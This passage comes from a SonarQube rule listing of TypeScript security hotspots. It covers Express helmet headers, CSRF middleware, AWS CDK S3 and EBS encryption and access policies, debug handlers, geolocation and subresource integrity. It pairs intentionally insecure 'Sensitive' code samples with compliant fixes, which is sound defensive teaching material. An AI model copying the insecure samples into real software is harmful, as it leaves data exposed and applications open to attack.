let app &#61; express();

app.use(
    helmet({
      expectCt: false // Sensitive
    })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application the <a href="https://www.npmjs.com/package/expect-ct" rel="nofollow">expect-ct</a> middleware is the standard way to implement
expect-ct. Usually, the deployment of this policy starts with the report only mode (<code>enforce: false</code>) and with a low <code>maxAge</code>
(the number of seconds the policy will apply) value and next if everything works well it is recommended to block future connections that violate
Expect-CT policy (<code>enforce: true</code>) and greater value for maxAge directive:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(helmet.expectCt({
  enforce: true,
  maxAge: 86400
})); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> -
  Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency" rel="nofollow">developer.mozilla.org</a> - Certificate Transparency
  </li><li> <a href="https://en.wikipedia.org/wiki/Certificate_authority" rel="nofollow">wikipedia.org</a> - Certificate Authority </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6275">
              typescript:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default" rel="nofollow">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The disk contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html" rel="nofollow">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
import { Size } from &#39;aws-cdk-lib&#39;;
import { Volume } from &#39;aws-cdk-lib/aws-ec2&#39;;

new Volume(this, &#39;unencrypted-explicit&#39;, {
      availabilityZone: &#39;us-west-2a&#39;,
      size: Size.gibibytes(1),
      encrypted: false // Sensitive
    });
</pre>
<pre>
import { Size } from &#39;aws-cdk-lib&#39;;
import { Volume } from &#39;aws-cdk-lib/aws-ec2&#39;;

new Volume(this, &#39;unencrypted-implicit&#39;, {
      availabilityZone: &#39;eu-west-1a&#39;,
      size: Size.gibibytes(1),
    }); // Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html" rel="nofollow">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
import { Size } from &#39;aws-cdk-lib&#39;;
import { Volume } from &#39;aws-cdk-lib/aws-ec2&#39;;

new Volume(this, &#39;encrypted-explicit&#39;, {
      availabilityZone: &#39;eu-west-1a&#39;,
      size: Size.gibibytes(1),
      encrypted: true
    });
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html" rel="nofollow">Amazon EBS encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6270">
              typescript:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The AWS resource stores or processes sensitive data. </li><li> The AWS resource is designed to be private. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;
import { aws_s3 as s3 } from &#39;aws-cdk-lib&#39;

const bucket &#61; new s3.Bucket(this, &#34;ExampleBucket&#34;)

bucket.addToResourcePolicy(new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: [&#34;s3:*&#34;],
    resources: [bucket.arnForObjects(&#34;*&#34;)],
    principals: [new iam.AnyPrincipal()] // Sensitive
}))
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;
import { aws_s3 as s3 } from &#39;aws-cdk-lib&#39;

const bucket &#61; new s3.Bucket(this, &#34;ExampleBucket&#34;)

bucket.addToResourcePolicy(new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: [&#34;s3:*&#34;],
    resources: [bucket.arnForObjects(&#34;*&#34;)],
    principals: [new iam.AccountRootPrincipal()]
}))
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6249">
              typescript:S6249
            </a>
          </td>
          <td>
            <details>
              <p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>
<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It
means that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enforce HTTPS only access by setting <code>enforceSSL</code> property to <code>true</code></p>
<h2>Sensitive Code Example</h2>
<p>S3 bucket objects access through TLS is not enforced by default:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

const bucket &#61; new s3.Bucket(this, &#39;example&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

const bucket &#61; new s3.Bucket(this, &#39;example&#39;, {
    bucketName: &#39;example&#39;,
    versioned: true,
    publicReadAccess: false,
    enforceSSL: true
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit" rel="nofollow">AWS documentation</a> - Enforce encryption
  of data in transit </li><li> <a href="https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5" rel="nofollow">AWS Foundational Security
  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html" rel="nofollow">AWS CDK version 2</a> - Bucket </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4502">
              typescript:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The web application uses cookies to authenticate users. </li><li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li><li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Protection against CSRF attacks is strongly recommended:
    <ul><li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">unsafe HTTP
      methods</a>. </li><li> implemented, for example, with an unguessable CSRF token </li></ul>  </li><li> Of course all sensitive operations should not be performed with <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">Express.js CSURF middleware</a> protection is not found on an unsafe HTTP method like POST
method:</p>
<pre>
let csrf &#61; require(&#39;csurf&#39;);
let express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: true });

let app &#61; express();

// Sensitive: this operation doesn&#39;t look like protected by CSURF middleware (csrfProtection is not used)
app.post(&#39;/money_transfer&#39;, parseForm, function (req, res) {
  res.send(&#39;Money transferred&#39;);
});
</pre>
<p>Protection provided by <a href="https://www.npmjs.com/package/csurf" rel="nofollow">Express.js CSURF middleware</a> is globally disabled on unsafe methods:</p>
<pre>
let csrf &#61; require(&#39;csurf&#39;);
let express &#61; require(&#39;express&#39;);

app.use(csrf({ cookie: true, ignoreMethods: [&#34;POST&#34;, &#34;GET&#34;] })); // Sensitive as POST is unsafe method
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">Express.js CSURF middleware</a> protection is used on unsafe methods:</p>
<pre>
let csrf &#61; require(&#39;csurf&#39;);
let express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie:  true });

let app &#61; express();

app.post(&#39;/money_transfer&#39;, parseForm, csrfProtection, function (req, res) { // Compliant
  res.send(&#39;Money transferred&#39;)
});
</pre>
<p>Protection provided by <a href="https://www.npmjs.com/package/csurf" rel="nofollow">Express.js CSURF middleware</a> is enabled on unsafe methods:</p>
<pre>
let csrf &#61; require(&#39;csurf&#39;);
let express &#61; require(&#39;express&#39;);

app.use(csrf({ cookie: true, ignoreMethods: [&#34;GET&#34;] })); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/352" rel="nofollow">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/csrf" rel="nofollow">OWASP: Cross-Site Request Forgery</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6245">
              typescript:S6245
            </a>
          </td>
          <td>
            <details>
              <p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul><li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul><li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li></ul>  </li><li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul><li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li></ul>  </li><li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul><li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li></ul>  </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;default&#39;
}); // Sensitive
</pre>
<p>Bucket encryption is disabled by default.</p>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    encryption: s3.BucketEncryption.KMS_MANAGED
});

# Alternatively with a KMS key managed by the user.

new s3.Bucket(this, &#39;id&#39;, {
    encryption: s3.BucketEncryption.KMS_MANAGED,
    encryptionKey: access_key
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html" rel="nofollow">AWS documentation</a> - Protecting data using
  server-side encryption </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html" rel="nofollow">AWS CDK version 2</a> - BucketEncryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4507">
              typescript:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/errorhandler" rel="nofollow">errorhandler Express.js middleware</a> should not be used in production:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const errorhandler &#61; require(&#39;errorhandler&#39;);

let app &#61; express();
app.use(errorhandler()); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/errorhandler" rel="nofollow">errorhandler Express.js middleware</a> used only in development mode:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const errorhandler &#61; require(&#39;errorhandler&#39;);

let app &#61; express();

if (process.env.NODE_ENV &#61;&#61;&#61; &#39;development&#39;) {
  app.use(errorhandler());
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5604">
              typescript:S5604
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://www.w3.org/TR/permissions/#powerful-feature" rel="nofollow">Powerful features</a> are browser features (geolocation, camera, microphone …​) that
can be accessed with JavaScript API and may require a permission granted by the user. These features can have a high impact on privacy and user
security thus they should only be used if they are really necessary to implement the critical parts of an application.</p>
<p>This rule highlights intrusive permissions when requested with <a href="https://developer.mozilla.org/en-US/docs/Web/API/Permissions/query" rel="nofollow">the
future standard (but currently experimental) web browser query API</a> and specific APIs related to the permission. It is highly recommended to
customize this rule with the permissions considered as intrusive in the context of the web application.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some powerful features used by the application are not really necessary. </li><li> Users are not clearly informed why and when powerful features are used by the application. </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> In order to respect user privacy it is recommended to avoid using intrusive powerful features. </li></ul>
<h2>Sensitive Code Example</h2>
<p>When using <a href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API" rel="nofollow">geolocation API</a>, Firefox for example retrieves personal
information like nearby wireless access points and IP address and sends it to the default geolocation service provider, <a href="https://www.google.com/privacy/lsf.html" rel="nofollow">Google Location Services</a>:</p>
<pre>
navigator.permissions.query({name:&#34;geolocation&#34;}).then(function(result) {
});  // Sensitive: geolocation is a powerful feature with high privacy concerns

navigator.geolocation.getCurrentPosition(function(position) {
  console.log(&#34;coordinates x&#61;&#34;&#43;position.coords.latitude&#43;&#34; and y&#61;&#34;&#43;position.coords.longitude);
}); // Sensitive: geolocation is a powerful feature with high privacy concerns
</pre>
<h2>Compliant Solution</h2>
<p>If geolocation is required, always explain to the user why the application needs it and prefer requesting an approximate location when
possible:</p>
<pre>
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;
        Retailer website example
    &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    Type a city, street or zip code where you want to retrieve the closest retail locations of our products:
    &lt;form method&#61;post&gt;
        &lt;input type&#61;text value&#61;&#34;New York&#34;&gt; &lt;!-- Compliant --&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Web Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/250" rel="nofollow">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li><li> <a href="https://cwe.mitre.org/data/definitions/359" rel="nofollow">MITRE, CWE-359</a> - Exposure of Private Information </li><li> <a href="https://www.w3.org/TR/permissions/" rel="nofollow">W3C</a> - Permissions </li><li> <a href="https://support.mozilla.org/en-US/kb/does-firefox-share-my-location-websites" rel="nofollow">Mozilla</a> - Does Firefox share my location with
  websites? </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5725">
              typescript:S5725
            </a>
          </td>
          <td>
            <details>
              <p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>
<p>On the client side, where front-end code is executed, malicious code could:</p>
<ul><li> impersonate users&#39; identities and take advantage of their privileges on the application. </li><li> add quiet malware that monitors users&#39; session and capture sensitive secrets. </li><li> gain access to sensitive clients&#39; personal data. </li><li> deface, or otherwise affect the general availability of the application. </li><li> mine cryptocurrencies in the background. </li></ul>
<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For
example, server-side malware could:</p>
<ul><li> access and modify sensitive technical and business data. </li><li> elevate its privileges on the underlying operating system. </li><li> Use the compromised application as a pivot to attack the local network. </li></ul>
<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes
applied to it before it is downloaded.<br /> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication
website or that was legitimately changed by its author, in a more benign scenario.</p>
<p>Important note: downloading an artifact over HTTPS only protects it while in transit from one host to another. It provides authenticity and
integrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The artifact is a file intended to execute code. </li><li> The artifact is a file that is intended to configure or affect running code in some way. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified
since the fingerprint was computed.</p>
<p>In this case, the artifact’s hash must:</p>
<ul><li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li><li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li></ul>
<p>To do so, the best option is to add the hash in the code explicitly, by following <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes" rel="nofollow">Mozilla’s official documentation on
how to generate integrity strings</a>.</p>
<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named &#34;latest&#34; or similar, so that the
front-end pages do not break when the code of the latest remote artifact changes.</strong></p>
<h2>Sensitive Code Example</h2>
<p>The following code sample uses neither integrity checks nor version pinning:</p>
<pre>
let script &#61; document.createElement(&#34;script&#34;);
script.src &#61; &#34;https://cdn.example.com/latest/script.js&#34;; // Sensitive
script.crossOrigin &#61; &#34;anonymous&#34;;
document.head.appendChild(script);
</pre>
<h2>Compliant Solution</h2>
<pre>
let script &#61; document.createElement(&#34;script&#34;);
script.src &#61; &#34;https://cdn.example.com/v5.3.6/script.js&#34;;
script.integrity &#61; &#34;sha384-oqVuAfXRKap7fdgcCY5uykM6&#43;R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC&#34;;
script.crossOrigin &#61; &#34;anonymous&#34;;
document.head.appendChild(script);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://cwe.mitre.org/data/definitions/353" rel="nofollow">MITRE, CWE-353</a> - Missing Support for Integrity Check </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category
  A6</a> - Security Misconfiguration </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" rel="nofollow">developer.mozilla.org</a> - Subresource Integrity </li><li> <a href="https://en.wikipedia.org/wiki/Watering_hole_attack" rel="nofollow">Wikipedia, Watering Hole Attacks</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5728">
              typescript:S5728
            </a>
          </td>
          <td>
            <details>
              <p>Content security policy (CSP) (fetch directives) is a <a href="https://www.w3.org/TR/CSP3/" rel="nofollow">W3C standard </a> which is used by a server to specify,
via a http header, the origins from where the browser is allowed to load resources. It can help to mitigate the risk of cross site scripting (XSS)
attacks and reduce privileges used by an application. If the website doesn’t define CSP header the browser will apply <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">same-origin policy</a> by default.</p>
<pre>
Content-Security-Policy: default-src &#39;self&#39;; script-src ‘self ‘ http://www.example.com
</pre>
<p>In the above example, all resources are allowed from the website where this header is set and script resources fetched from example.com are also
authorized:</p>
<pre>
&lt;img src&#61;&#34;selfhostedimage.png&gt;&lt;/script&gt; &lt;!-- will be loaded because default-src &#39;self&#39;; directive is applied  --&gt;
&lt;img src&#61;&#34;http://www.example.com/image.png&gt;&lt;/script&gt;  &lt;!-- will NOT be loaded because default-src &#39;self&#39;; directive is applied  --&gt;
&lt;script src&#61;&#34;http://www.example.com/library.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;
&lt;script src&#61;&#34;selfhostedscript.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.com directive is applied  --&gt;
&lt;script src&#61;&#34;http://www.otherexample.com/library.js&gt;&lt;/script&gt; &lt;!-- will NOT be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;
</pre>
<h2>Ask Yourself Whether</h2>
<ul><li> The resources of the application are fetched from various untrusted locations. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy fetch directives, in particular <em>default-src</em> directive and continue to properly sanitize and validate all
inputs of the application, indeed CSP fetch directives is only a tool to reduce the impact of cross site scripting attacks.</p>
<h2>Sensitive Code Example</h2>
<p>In a Express.js application, the code is sensitive if the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> contentSecurityPolicy
middleware is disabled:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();
app.use(
    helmet({
      contentSecurityPolicy: false, // sensitive
    })
);
</pre>
<h2>Compliant Solution</h2>
<p>In a Express.js application, a standard way to implement CSP is the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet contentSecurityPolicy
middleware</a>:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();
app.use(helmet.contentSecurityPolicy()); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.w3.org/TR/CSP3/" rel="nofollow">w3.org</a> - Content Security Policy Level 3 </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category
  A6</a> - Security Misconfiguration </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">developer.mozilla.org</a> - Content Security Policy (CSP) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5042">
              typescript:S5042
            </a>
          </td>
          <td>
            <details>
